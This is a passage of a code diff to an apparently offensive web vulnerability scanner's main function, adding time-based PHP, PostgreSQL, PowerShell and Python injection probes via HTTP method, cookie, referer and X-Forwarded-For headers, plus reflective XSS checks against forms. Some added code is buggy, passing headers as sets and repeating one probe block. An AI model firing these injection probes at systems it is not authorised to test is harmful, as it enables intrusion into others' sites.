+                    if end - start >= 55:
+                        hits.append(f"php injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"php injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -1157,12 +1267,27 @@ def cobra(host,delay=0,crawl=1):
 
                 except:
                     pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"php injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"php injection in x-forwarded-for ({mal}): {_}")
+
+                except:
+                    pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -1176,14 +1301,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -1226,9 +1351,9 @@ def cobra(host,delay=0,crawl=1):
                     except:
                         pass
 
-            # check for postgresql injection
+            # check for postgresql injection time based payload
+            print(CYAN + f"checking: {_} with postgresql injection time based payloads")
             for mal in mal_postgresql:
-                print(CYAN + f"checking: {_} with postgresql injection payload {mal}")
                 try:
                     time.sleep(delay)
                     start = time.time()
@@ -1240,6 +1365,21 @@ def cobra(host,delay=0,crawl=1):
                 except HTTPError as error:
                     if error.code == 504:
                         hits.append(f"postgresql injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"posgtresql injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"postgresql injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -1273,12 +1413,27 @@ def cobra(host,delay=0,crawl=1):
 
                 except:
                     pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"postgresql injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"postgresql injection in x-forwarded-for ({mal}): {_}")
+
+                except:
+                    pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -1292,14 +1447,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -1342,9 +1497,9 @@ def cobra(host,delay=0,crawl=1):
                     except:
                         pass
                                 
-            # check for powershell injection
+            # check for powershell injection time based payload
+            print(CYAN + f"checking: {_} with powershell injection time based payloads")
             for mal in mal_powershell:
-                print(CYAN + f"checking: {_} with powershell injection payload {mal}")
                 try:
                     time.sleep(delay)
                     start = time.time()
@@ -1356,6 +1511,21 @@ def cobra(host,delay=0,crawl=1):
                 except HTTPError as error:
                     if error.code == 504:
                         hits.append(f"powershell injection in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"powershell injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"powershell injection in method ({mal}): {_}")
 
                 except:
                     pass
@@ -1389,12 +1559,27 @@ def cobra(host,delay=0,crawl=1):
 
                 except:
                     pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"powershell injection in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"powershell injection in x-forwarded-for ({mal}): {_}")
+
+                except:
+                    pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -1408,14 +1593,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -1457,22 +1642,51 @@ def cobra(host,delay=0,crawl=1):
 
                     except:
                         pass
-                                
 
-            # check for python injection
-            for mal in mal_python:
-                print(CYAN + f"checking: {_} with python injection payload {mal}")
+            # check for python injection time based payload
+            print(CYAN + f"checking: {_} with python injection time based payloads")
+            for mal in mal_python_time:
                 try:
                     time.sleep(delay)
                     start = time.time()
                     data = text(_ + "/" + mal, timeout=120)
                     end = time.time()
                     if end - start >= 55:
-                        hits.append(f"python injection in url: {_}/{mal}")
+                        hits.append(f"python injection time based payload in url: {_}/{mal}")
 
                 except HTTPError as error:
                     if error.code == 504:
-                        hits.append(f"python injection in url: {_}/{mal}")
+                        hits.append(f"python injection time based payload in url: {_}/{mal}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"python injection in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"python injection in method ({mal}): {_}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"python injection time based payload in method: {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"python injection time based payload in method: {_}")
 
                 except:
                     pass
@@ -1483,11 +1697,11 @@ def cobra(host,delay=0,crawl=1):
                     data = text(_, headers = {"Cookie",mal}, timeout=120)
                     end = time.time()
                     if end - start >= 55:
-                        hits.append(f"python injection in cookie ({mal}): {_}")
+                        hits.append(f"python injection time based payload in cookie ({mal}): {_}")
 
                 except HTTPError as error:
                     if error.code == 504:
-                        hits.append(f"python injection in cookie ({mal}): {_}")
+                        hits.append(f"python injection time based payload in cookie ({mal}): {_}")
 
                 except:
                     pass
@@ -1498,20 +1712,35 @@ def cobra(host,delay=0,crawl=1):
                     data = text(_, headers = {"Referer",mal}, timeout=120)
                     end = time.time()
                     if end - start >= 55:
-                        hits.append(f"python injection in referer ({mal}): {_}")
+                        hits.append(f"python injection time based payload in referer ({mal}): {_}")
 
                 except HTTPError as error:
                     if error.code == 504:
-                        hits.append(f"python injection in referer ({mal}): {_}")
+                        hits.append(f"python injection time based payload in referer ({mal}): {_}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"python injection time based payload in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"python injection time based payload in x-forwarded-for ({mal}): {_}")
 
                 except:
                     pass
                 
                 for form in forms:
                     field_list = []
-                    input_field = re.findall("<input.+?>",form)
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                         if action_field.startswith("/"):
                             action = _ + action_field
 
@@ -1525,14 +1754,14 @@ def cobra(host,delay=0,crawl=1):
                         pass
 
                     try:
-                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                         for in_field in input_field:
-                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 try:
-                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
                                 except IndexError:
                                     value_field = ""
@@ -1555,124 +1784,150 @@ def cobra(host,delay=0,crawl=1):
                                     data = text(action,method=method_field,data=field_dict, timeout=120)
                                     end = time.time()
                                     if end - start >= 55:
-                                        hits.append(f"python injection in forms: {action} | {field_dict}")
+                                        hits.append(f"python injection time based payload in forms: {action} | {field_dict}")
 
                                 else:
                                     start = time.time()
                                     data = text(_,method=method_field,data=field_dict, timeout=120)
                                     end = time.time()
                                     if end - start >= 55:
-                                        hits.append(f"python injection in forms: {_} | {field_dict}")
+                                        hits.append(f"python injection time based payload in forms: {_} | {field_dict}")
 
                     except HTTPError as error:
                         if error.code == 504:
                             if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
-                                hits.append(f"python injection in forms: {action} | {field_dict}")
+                                hits.append(f"python injection time based payload in forms: {action} | {field_dict}")
 
                             else:
-                                hits.append(f"python injection in forms: {_} | {field_dict}")
+                                hits.append(f"python injection time based payload in forms: {_} | {field_dict}")
 
                     except:
                         pass
 
-            # check for xss
-            for mal in mal_xss:
-                if "%" not in mal and "\\u" not in mal.lower() and not re.search("cu.*%", mal.lower()) and not re.search("%.*cu", mal.lower()):
-                    print(CYAN + f"checking: {_} with xss payload {mal}")
+            # check for reflective xss
+            print(CYAN + f"checking: {_} with reflective xss payloads")
+            for mal in mal_reflective_xss:
+                try:
+                    time.sleep(delay)
+                    data = text(_ + "/" + mal)
+                    if mal in data:
+                        hits.append(f"reflective xss in url: {_}/{mal}")
+
+                except HTTPError as error:
+                    pass
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    start = time.time()
+                    data = text(_, method=mal, timeout=120)
+                    end = time.time()
+                    if end - start >= 55:
+                        hits.append(f"reflective xss in method ({mal}): {_}")
+
+                except HTTPError as error:
+                    if error.code == 504:
+                        hits.append(f"reflective xss in method ({mal}): {_}")
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    data = text(_, headers = {"Cookie",mal})
+                    if mal in data:
+                        hits.append(f"reflective xss in cookie ({mal}): {_}")
+
+                except HTTPError as error:
+                    pass
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    data = text(_, headers = {"Referer",mal})
+                    if mal in data:
+                        hits.append(f"reflective xss in referer ({mal}): {_}")
+
+                except HTTPError as error:
+                    pass
+
+                except:
+                    pass
+
+                try:
+                    time.sleep(delay)
+                    data = text(_, headers = {"X-Forwarded-For",mal})
+                    if mal in data:
+                        hits.append(f"reflective xss in x-forwarded-for ({mal}): {_}")
+
+                except HTTPError as error:
+                    pass
+
+                except:
+                    pass
+                
+                for form in forms:
+                    field_list = []
+                    input_field = re.findall(r"<input.+?>",form)
                     try:
-                        time.sleep(delay)
-                        data = text(_ + "/" + mal)
-                        if mal in data:
-                            hits.append(f"xss in url: {_}/{mal}")
+                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
+                        if action_field.startswith("/"):
+                            action = _ + action_field
 
-                    except HTTPError as error:
-                        pass
+                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
+                            action = _ + "/" + action_field
 
-                    except:
-                        pass
-
-                    try:
-                        time.sleep(delay)
-                        data = text(_, headers = {"Cookie",mal})
-                        if mal in data:
-                            hits.append(f"xss in cookie ({mal}): {_}")
-
-                    except HTTPError as error:
-                        pass
-
-                    except:
+                        else:
+                            action = action_field
+                            
+                    except IndexError:
                         pass
 
                     try:
-                        time.sleep(delay)
-                        data = text(_, headers = {"Referer",mal})
-                        if mal in data:
-                            hits.append(f"xss in referer ({mal}): {_}")
-
-                    except HTTPError as error:
-                        pass
-
-                    except:
-                        pass
-                    
-                    for form in forms:
-                        field_list = []
-                        input_field = re.findall("<input.+?>",form)
-                        try:
-                            action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
-                            if action_field.startswith("/"):
-                                action = _ + action_field
-
-                            elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
-                                action = _ + "/" + action_field
-
-                            else:
-                                action = action_field
+                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
+                        for in_field in input_field:
+                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
+                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                 
-                        except IndexError:
-                            pass
-
-                        try:
-                            method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
-                            for in_field in input_field:
-                                if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
-                                    name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                    type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                    
-                                    try:
-                                        value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
-                                    
-                                    except IndexError:
-                                        value_field = ""
-                                    
-                                    if type_field == "submit" or type_field == "hidden":
-                                        field_list.append({name_field:value_field})
+                                try:
+                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
+                                
+                                except IndexError:
+                                    value_field = ""
+                                
+                                if type_field == "submit" or type_field == "hidden":
+                                    field_list.append({name_field:value_field})
 
 
-                                    if type_field != "submit" and type_field != "hidden":
-                                        field_list.append({name_field:mal})
+                                if type_field != "submit" and type_field != "hidden":
+                                    field_list.append({name_field:mal})
 
-                                    field_dict = field_list[0]
-                                    for init_field_dict in field_list[1:]:
-                                        field_dict.update(init_field_dict)
+                                field_dict = field_list[0]
+                                for init_field_dict in field_list[1:]:
+                                    field_dict.update(init_field_dict)
 
-                                    time.sleep(delay)
+                                time.sleep(delay)
 
-                                    if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
-                                        data = text(action,method=method_field,data=field_dict)
-                                        if mal in data:
-                                            hits.append(f"xss in forms: {action} | {field_dict}")
+                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
+                                    data = text(action,method=method_field,data=field_dict)
+                                    if mal in data:
+                                        hits.append(f"reflective xss in forms: {action} | {field_dict}")
 
-                                    else:
-                                        data = text(_,method=method_field,data=field_dict)
-                                        if mal in data:
-                                            hits.append(f"xss in forms: {_} | {field_dict}")
+                                else:
+                                    data = text(_,method=method_field,data=field_dict)
+                                    if mal in data:
+                                        hits.append(f"reflective xss in forms: {_} | {field_dict}")
 
-                        except HTTPError as error:
-                            pass
+                    except HTTPError as error:
+                        pass
 
-                        except:
-                            pass
+                    except:
+                        pass
 
     clear()
     hits = list(set(hits[:]))
